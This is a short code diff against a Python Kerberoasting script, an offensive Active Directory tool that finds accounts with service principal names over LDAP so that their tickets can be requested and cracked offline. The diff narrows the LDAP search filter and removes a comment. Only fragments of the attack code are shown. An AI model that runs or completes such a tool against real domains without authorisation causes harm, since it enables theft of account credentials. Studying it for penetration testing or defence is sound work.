@@ -10,7 +10,7 @@ def find_kerberoastable_users(username, password, domain, dc_ip):
 
         # Search for kerberoastable users (users with SPNs set)
         conn.search(search_base='DC=' + ',DC='.join(domain.split('.')),
-                     search_filter='(&(objectCategory=user)(servicePrincipalName=*))',
+                     search_filter='(&(objectCategory=user)(objectClass=user)(servicePrincipalName=*))',
                      search_scope=SUBTREE,
                      attributes=['sAMAccountName'])
 
@@ -45,9 +45,6 @@ def kerberoast_kerberoastable_users(username, password, domain, dc_ip):
 
     except Exception as e:
         print(f"Error during Kerberoasting: {e}")
-
-# Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
-
 
 # Example usage:
 username = input("Enter username: ")
